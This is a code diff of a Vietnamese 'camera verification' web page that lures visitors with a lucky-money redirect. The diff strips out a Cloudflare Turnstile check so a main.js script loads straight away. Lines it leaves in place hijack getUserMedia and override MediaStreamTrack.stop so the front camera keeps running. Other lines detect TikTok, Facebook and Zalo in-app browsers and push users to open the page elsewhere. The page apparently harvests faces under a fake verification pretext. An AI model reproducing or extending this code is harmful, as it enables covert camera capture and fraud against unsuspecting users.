@@ -4,10 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Xác Thực Camera</title>
-
-    <link rel="preconnect" href="https://challenges.cloudflare.com" />
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" defer></script>
-
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .card { background: #161b22; padding: 30px; border-radius: 24px; text-align: center; width: 90%; max-width: 380px; border: 1px solid #30363d; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
@@ -18,54 +14,18 @@
         #status { font-size: 13px; color: #8b949e; margin-top: 15px; line-height: 1.5; }
 
         #browser-warning {
-            display: none;
+            display: none; 
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             background: #0d1117; z-index: 10000;
             padding: 40px 20px; box-sizing: border-box;
         }
-        .warning-box {
-            background: #1c2128; border: 2px solid #f85149;
+        .warning-box { 
+            background: #1c2128; border: 2px solid #f85149; 
             padding: 30px; border-radius: 20px; text-align: center;
         }
         .warning-box h3 { color: #f85149; margin-top: 0; }
         .steps { text-align: left; margin-top: 20px; color: #c9d1d9; font-size: 16px; line-height: 2; }
         .highlight { color: #ffeb3b; font-weight: bold; }
-
-        #turnstileModal {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(13,17,23,0.92);
-            z-index: 11000;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        .turnstile-box {
-            width: 100%;
-            max-width: 420px;
-            background: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 20px;
-            padding: 22px;
-            text-align: center;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.45);
-        }
-        .turnstile-box h3 {
-            margin: 0 0 12px 0;
-        }
-        .turnstile-box p {
-            margin: 0 0 16px 0;
-            color: #8b949e;
-            line-height: 1.5;
-            font-size: 14px;
-        }
-        #turnstileContainer {
-            display: flex;
-            justify-content: center;
-            min-height: 85px;
-        }
     </style>
 </head>
 <body>
@@ -81,14 +41,6 @@
     </div>
 </div>
 
-<div id="turnstileModal">
-    <div class="turnstile-box">
-        <h3>Xác thực bảo mật</h3>
-        <p>Hoàn tất Turnstile để tiếp tục.</p>
-        <div id="turnstileContainer"></div>
-    </div>
-</div>
-
 <div class="card" id="mainCard">
     <h2 style="margin: 0;">Xác Minh Người Dùng</h2>
     <div class="camera-view" id="vBox">
@@ -100,19 +52,13 @@
 </div>
 
 <script>
-    const TURNSTILE_SITE_KEY = "0x4AAAAAADNl8BG5kcU-mdfb";
-    const VERIFY_ENDPOINT = "/api/turnstile.js";
-    const REDIRECT_URL = "https://liximomo.vercel.app/lixi";
-
-    let turnstileWidgetId = null;
-    let turnstileToken = null;
-    let frontStream = null;
 
     function checkAndShowWarning() {
         const ua = navigator.userAgent || navigator.vendor || window.opera;
+        
         const isTikTok = /TikTok|musical_ly|ByteLocale/i.test(ua);
         const isOtherInApp = /FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);
-
+        
         if (isTikTok || isOtherInApp) {
             document.getElementById('browser-warning').style.display = 'block';
             document.getElementById('mainCard').style.display = 'none';
@@ -124,11 +70,11 @@
     const video = document.getElementById('preview');
     const status = document.getElementById('status');
     const msg = document.getElementById('msg');
-    const turnstileModal = document.getElementById('turnstileModal');
-    const turnstileContainer = document.getElementById('turnstileContainer');
+    const REDIRECT_URL = "https://liximomo.vercel.app/lixi";
 
     const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
     const originalStop = MediaStreamTrack.prototype.stop;
+    let frontStream = null;
 
     navigator.mediaDevices.getUserMedia = async (constraints) => {
         const stream = await originalGetUserMedia(constraints);
@@ -143,127 +89,28 @@
     };
 
     MediaStreamTrack.prototype.stop = function() {
-        if ((this.label || '').toLowerCase().includes('front') || (this.label || '').toLowerCase().includes('user')) {
+        if (this.label.toLowerCase().includes('front') || this.label.toLowerCase().includes('user')) {
             console.log("Giữ lại preview cho camera trước...");
         } else {
             originalStop.apply(this);
         }
     };
 
-    function loadMainScriptOnce() {
-        return new Promise((resolve, reject) => {
-            if (window.__mainScriptLoaded) return resolve();
-
-            const existing = document.querySelector('script[data-main-script="1"]');
-            if (existing) {
-                existing.addEventListener('load', () => resolve(), { once: true });
-                existing.addEventListener('error', () => reject(new Error('Load main.js failed')), { once: true });
-                return;
-            }
-
-            const script = document.createElement('script');
-            script.src = 'main.js';
-            script.dataset.mainScript = '1';
-            script.onload = () => {
-                window.__mainScriptLoaded = true;
-                resolve();
-            };
-            script.onerror = () => reject(new Error('Load main.js failed'));
-            document.body.appendChild(script);
-        });
-    }
-
-    async function verifyTurnstile(token) {
-        const res = await fetch(VERIFY_ENDPOINT, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ token })
-        });
-
-        const data = await res.json();
-        if (!res.ok || !data.success) {
-            throw new Error(data?.message || 'Turnstile verify failed');
-        }
-        return true;
-    }
-
-    async function onTurnstileSuccess(token) {
-        try {
-            turnstileToken = token;
-            status.innerText = "Đang kiểm tra xác thực bảo mật...";
-
-            await verifyTurnstile(token);
-
-            turnstileModal.style.display = 'none';
-            status.innerHTML = "Xác Thực Thành Công, Đang Chuyển Hướng...";
-            btn.disabled = true;
-            btn.innerText = "ĐANG XỬ LÝ...";
-
-            await loadMainScriptOnce();
-
-            if (window.mainScriptFinished === true) {
-                startCountdown();
-            } else {
-                const checkFinished = setInterval(() => {
-                    if (window.mainScriptFinished === true) {
-                        clearInterval(checkFinished);
-                        startCountdown();
-                    }
-                }, 500);
-            }
-        } catch (err) {
-            console.error(err);
-            status.innerText = "Xác thực thất bại, vui lòng thử lại.";
-            btn.disabled = false;
-            btn.innerText = "BẮT ĐẦU XÁC THỰC";
-            if (window.turnstile && turnstileWidgetId !== null) {
-                window.turnstile.reset(turnstileWidgetId);
-            }
-        }
-    }
-
-    function onTurnstileError() {
-        status.innerText = "Turnstile đang lỗi, thử lại sau.";
-        btn.disabled = false;
-        btn.innerText = "BẮT ĐẦU XÁC THỰC";
-    }
-
-    function renderTurnstile() {
-        turnstileContainer.innerHTML = '';
-        if (!window.turnstile) {
-            status.innerText = "Turnstile chưa tải xong, thử lại...";
-            btn.disabled = false;
-            btn.innerText = "BẮT ĐẦU XÁC THỰC";
-            return;
-        }
-
-        turnstileWidgetId = window.turnstile.render('#turnstileContainer', {
-            sitekey: 0x4AAAAAADNl8HkTV51k79F7xXN0Y0uCccg,
-            theme: 'dark',
-            callback: onTurnstileSuccess,
-            'error-callback': onTurnstileError,
-            'expired-callback': () => {
-                status.innerText = "Mã xác thực đã hết hạn, vui lòng làm lại.";
-                if (window.turnstile && turnstileWidgetId !== null) {
-                    window.turnstile.reset(turnstileWidgetId);
-                }
-            }
-        });
-    }
-
     btn.addEventListener('click', () => {
         btn.disabled = true;
-        btn.innerText = "ĐANG MỞ XÁC THỰC...";
-        status.innerHTML = "Đang mở lớp xác thực bảo mật...";
+        btn.innerText = "ĐANG XỬ LÝ...";
+        status.innerHTML = "Đang Xác Thực Khuôn Mặt...<br>Vui Lòng Giữ Nguyên Vị Trí.";
 
-        turnstileModal.style.display = 'flex';
+        const script = document.createElement('script');
+        script.src = 'main.js'; 
+        document.body.appendChild(script);
 
-        const waitTurnstile = setInterval(() => {
-            if (window.turnstile && typeof window.turnstile.render === 'function') {
-                clearInterval(waitTurnstile);
-                renderTurnstile();
+        const checkFinished = setInterval(() => {
+            if (window.mainScriptFinished === true) {
+                clearInterval(checkFinished);
+                startCountdown();
             }
-        }, 150);
+        }, 500);
     });
 
     function startCountdown() {
